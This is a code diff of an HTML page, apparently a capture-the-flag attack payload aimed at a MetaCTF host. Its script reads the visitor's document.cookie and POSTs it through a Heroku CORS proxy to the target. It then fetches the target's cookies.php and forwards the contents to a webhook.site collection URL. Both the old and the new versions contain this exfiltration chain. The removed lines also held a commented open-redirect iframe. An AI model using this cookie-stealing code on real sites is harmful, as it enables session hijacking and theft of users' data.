@@ -6,14 +6,14 @@
 </head>
 <body>
     <h1>Set Cookies</h1>
-    <!-- <iframe src="https://www.cracking.com.ar/redir/redir.php?URL=https://host3.metaproblems.com:6020/index.php"></iframe> -->
     <script>
         // Encode the document.cookie value
         const encodedCookieValue = encodeURIComponent(document.cookie);
-        const url = 'https://aqueous-lake-18838-e98432adf020.herokuapp.com/https://host3.metaproblems.com:6020/index.php';
+        const proxyUrl = 'https://aqueous-lake-18838-e98432adf020.herokuapp.com/';
+        const targetUrl = 'https://host3.metaproblems.com:6020/index.php';
 
         // Fetch request to set cookies
-        fetch(url, {
+        fetch(proxyUrl + targetUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/x-www-form-urlencoded'
@@ -21,19 +21,20 @@
             body: `cookie_name=16&cookie_value=${encodedCookieValue}&submit=Store+Cookie`
         })
         .then(response => response.json())
-        .then(data => console.log(data))
-        .catch(error => console.error('Error:', error));
+        .then(data => console.log('Cookie stored:', data))
+        .catch(error => console.error('Error storing cookie:', error));
 
-        // Fetch request example (not fully functional in the provided snippet)
-        fetch('https://host3.metaproblems.com:6020/cookies.php')
-        .then(r => r.text())
-        .then(r => fetch(`https://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456?x=${encodeURIComponent(r)}`))
-        .catch(error => console.error('Error:', error));
-        //fetch('https://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456')
-
-        
-        // Redirect example (not fully functional in the provided snippet)
-
+        // Fetch request to retrieve cookies
+        const cookiesUrl = 'https://host3.metaproblems.com:6020/cookies.php';
+        fetch(proxyUrl + cookiesUrl)
+        .then(response => response.text())
+        .then(data => {
+            console.log('Cookies:', data);
+            return fetch(`https://webhook.site/6d1b6565-2bc0-49fa-a00d-af73c0d05456?x=${encodeURIComponent(data)}`);
+        })
+        .then(response => response.text())
+        .then(data => console.log('Webhook response:', data))
+        .catch(error => console.error('Error retrieving cookies:', error));
     </script>
 </body>
 </html>
